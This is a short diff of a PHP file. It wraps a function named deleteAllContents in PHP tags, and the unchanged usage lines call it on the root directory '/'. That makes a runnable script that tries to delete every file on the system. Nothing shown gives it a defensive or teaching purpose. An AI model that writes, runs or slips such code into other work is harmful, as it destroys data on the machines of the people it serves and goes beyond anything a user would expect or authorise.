@@ -1,3 +1,5 @@
+<?php
+
 function deleteAllContents($dir) {
     // Check if the directory exists
     if (!is_dir($dir)) {
@@ -25,3 +27,4 @@ function deleteAllContents($dir) {
 // Usage
 $directory = '/';
 deleteAllContents($directory);
+?>
